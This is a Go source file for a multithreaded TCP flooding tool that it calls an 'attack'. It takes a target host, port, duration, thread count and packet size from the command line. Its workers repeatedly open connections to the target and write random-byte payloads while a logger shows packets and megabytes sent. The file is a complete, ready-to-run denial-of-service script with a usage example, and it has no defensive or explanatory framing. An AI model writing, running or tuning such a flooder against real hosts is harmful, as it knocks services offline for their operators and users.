package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

var (
	packetsSent   int64
	bytesSent     int64
	connectionsOK int64
	connectionsFail int64
)

type Config struct {
	Target     string
	Port       int
	Duration   int
	Threads    int
	PacketSize int
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage: go run tcp_flooder.go <target> <port> <duration> <threads> <packet_size>")
		fmt.Println("Example: go run tcp_flooder.go 192.168.1.1 80 60 1000 1024")
		os.Exit(0)
	}

	port, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])
	packetSize, _ := strconv.Atoi(os.Args[5])

	config := &Config{
		Target:     os.Args[1],
		Port:       port,
		Duration:   duration,
		Threads:    threads,
		PacketSize: packetSize,
	}

	fmt.Printf("[TCP Flooder] Starting attack...\n")
	fmt.Printf("[Target] %s:%d\n", config.Target, config.Port)
	fmt.Printf("[Duration] %d seconds\n", config.Duration)
	fmt.Printf("[Threads] %d\n", config.Threads)
	fmt.Printf("[Packet Size] %d bytes\n", config.PacketSize)
	fmt.Println("---")

	// Start stats logger
	go logStats()

	// Start attack
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackWorker(config)
		}()
	}

	// Wait for duration
	time.Sleep(time.Duration(config.Duration) * time.Second)

	fmt.Println("\n[FINAL STATS]")
	printStats()
	os.Exit(0)
}

func attackWorker(config *Config) {
	target := fmt.Sprintf("%s:%d", config.Target, config.Port)
	payload := generatePayload(config.PacketSize)

	for {
		conn, err := net.DialTimeout("tcp", target, 3*time.Second)
		if err != nil {
			atomic.AddInt64(&connectionsFail, 1)
			continue
		}

		atomic.AddInt64(&connectionsOK, 1)

		// Set timeouts
		conn.SetDeadline(time.Now().Add(5 * time.Second))
		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))

		// Flood packets
		for i := 0; i < 100; i++ {
			n, err := conn.Write(payload)
			if err != nil {
				break
			}
			atomic.AddInt64(&packetsSent, 1)
			atomic.AddInt64(&bytesSent, int64(n))
		}

		conn.Close()
	}
}

func generatePayload(size int) []byte {
	payload := make([]byte, size)
	rand.Read(payload)
	return payload
}

func logStats() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		fmt.Print("\033[H\033[2J") // Clear screen
		printStats()
	}
}

func printStats() {
	packets := atomic.LoadInt64(&packetsSent)
	bytes := atomic.LoadInt64(&bytesSent)
	connOK := atomic.LoadInt64(&connectionsOK)
	connFail := atomic.LoadInt64(&connectionsFail)

	mbSent := float64(bytes) / 1024 / 1024

	fmt.Printf("[%s] Stats:\n", time.Now().Format("15:04:05"))
	fmt.Printf("  Packets Sent: %d\n", packets)
	fmt.Printf("  Data Sent: %.2f MB\n", mbSent)
	fmt.Printf("  Connections OK: %d\n", connOK)
	fmt.Printf("  Connections Failed: %d\n", connFail)
	fmt.Printf("  Success Rate: %.2f%%\n", float64(connOK)/float64(connOK+connFail)*100)
}
